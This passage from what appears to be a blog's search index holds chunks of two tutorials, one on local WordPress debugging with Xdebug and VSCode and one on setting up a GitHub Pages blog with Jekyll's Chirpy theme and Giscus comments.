restart apache2 Configure VSCode launch.json\rOpen WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rAdd PHP Debug Extension on VSCode\rGo to Extensions (Ctrl+Shift+X) → search PHP Debug (by Felix Becker) → Install. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Check installation: php -v Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Append: zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rOpen WordPress folder in VSCode: code /srv/www/wordpress Create .vscode/launch.json: ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#configure-vscode-launchjson"},{"categories":["Web"],"collections":null,"content":"Extend\r","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#extend"},{"categories":["Web"],"collections":null,"content":"Required Version\rEach WordPress version usually requires a specific PHP version. Always check compatibility. ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#required-version"},{"categories":["Web"],"collections":null,"content":"WordPress Auto Update\rSince WordPress 3.7 (2013), WordPress supports automatic background updates for: Security releases Maintenance releases (Major versions require explicit opt-in) To disable auto updates, add to wp-config.php: define( 'WP_AUTO_UPDATE_CORE', false ); ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#wordpress-auto-update"},{"categories":["Web"],"collections":null,"content":"Increase Plugin Upload Size\rPaste below content into php.ini file. upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:4:3","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/#increase-plugin-upload-size"},{"categories":["Web"],"collections":null,"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"collections":null,"content":"When starting a personal blog, there are three tools you should know: GitHub Pages, Jekyll, and Giscus. Github Pages: A free service from GitHub that allows you to deploy static websites directly from a repository. Just push your code to GitHub, and your blog will automatically go live on the Internet without needing your own server. Jekyll: A static site generator integrated with GitHub Pages. Jekyll makes it easy to create blogs from Markdown files, organize content using templates, and apply ready-to-use themes. Giscus: A modern comment system based on GitHub Discussions. Instead of using external services like Disqus, you can leverage GitHub to manage comments, keeping it lightweight and developer-friendly. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#"},{"categories":["Web"],"collections":null,"content":"Requirements\rA Github account Basic knowledge of Markdown ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:1:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#requirements"},{"categories":["Web"],"collections":null,"content":"Creating a Site Repository\rHere, I use the Chirpy theme, a popular theme for GitHub Pages optimized for personal or technical blogging. Steps: Log in to Github and go to the starter. Instead of forking, click Use this template and select Create a new repository to automatically create a Site Repository. Name the new repository \u003cusername\u003e.github.io, replacing \u003cusername\u003e with your GitHub username. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:2:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#creating-a-site-repository"},{"categories":["Web"],"collections":null,"content":"Setting up the Environment\rThere are two main reasons to set up a local development environment for your blog: After pushing code to the repository, GitHub Actions takes time to run before building and rendering the site on GitHub Pages. By developing directly on your local machine, you can see changes instantly—faster and more convenient. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-the-environment"},{"categories":["Web"],"collections":null,"content":"Using Dev Containers (Recommended for Windows)\rDev Containers provide an isolated environment via Docker, preventing conflicts with your system and ensuring all dependencies are managed inside the container. Steps: Install Docker: On Windows/macOS: install Docker Desktop. On Linux: install Docker Engine. Install VS Code and the Dev Containers extension. Clone the repository: If using Docker Desktop: open VS Code and clone the repo in a container volume. If using Docker Engine: clone the repo locally, then open it in a container in VS Code. Wait for the Dev Containers setup process to complete. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#using-dev-containers-recommended-for-windows"},{"categories":["Web"],"collections":null,"content":"Setting up Natively (Recommended for Unix-like OS)\rFor Unix-like systems (Linux, macOS), you can set up the environment directly (natively) for better performance. Dev Containers are still available as an alternative. Steps: Follow the Jekyll installation guide and ensure Git is installed. Clone the repository locally. If you forked the theme, install Node.js and run bash tools/init.sh in the root folder to initialize the repo. Run the following commands in the root folder to install gems into ./vendor/bundle/ within the project—no need for sudo and no changes to /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-natively-recommended-for-unix-like-os"},{"categories":["Web"],"collections":null,"content":"Usage\r","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#usage"},{"categories":["Web"],"collections":null,"content":"Start the Jekyll Server\rTo run the site locally, use: bundle exec jekyll s ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#start-the-jekyll-server"},{"categories":["Web"],"collections":null,"content":"Configuration\rSome variables to configure in _config.yml include: lang: set the website language url: your website URL title: main title shown under the avatar tagline: subtitle or site description avatar: supports local and CORS resources, including gif ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#configuration"},{"categories":["Web"],"collections":null,"content":"Comment feature via Giscus\rWe’ll use Giscus as the comment system. Other free alternatives include Disqus and Utterances. Steps: Install giscus on GitHub. In your repository Settings, go to General and enable Discussions so giscus can store comments. Enter the repository name \u003cusername\u003e/\u003cusername\u003e.github.io. A green checkmark will appear when requirements are met. Choose the discussion category and topic for your site. Configure giscus in _config.yml: provider: set to giscus giscus: map the variables you set on giscus to the giscus section ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:3","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#comment-feature-via-giscus"},{"categories":["Web"],"collections":null,"content":"Customize the Favicon\rCreate a custom favicon for your website instead of using the theme’s default. Steps: Go to Favicon Generator. Click Browse to select your favicon file, then Create Favicon. Click Download the generated favicon to get the files. Extract the downloaded file and delete these two: browserconfig.xml site.webmanifest Copy the remaining files into assets/img/favicons (create the folder if it doesn’t exist). ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:4","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#customize-the-favicon"},{"categories":["Web"],"collections":null,"content":"Extends\r","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#extends"},{"categories":["Web"],"collections":null,"content":"Remove meta tag in Footer\rYou can remove the line Using the Chirpy theme for Jekyll. with these steps: Create a file at _data/locales/en.yml. Copy the contents of en.yml and paste into the new file. Change the value of meta to \"\". ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#remove-meta-tag-in-footer"},{"categories":["Web"],"collections":null,"content":"Write a post\rCheck the rules for writing blog posts with this theme and use Live Preview to preview your content. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#write-a-post"}]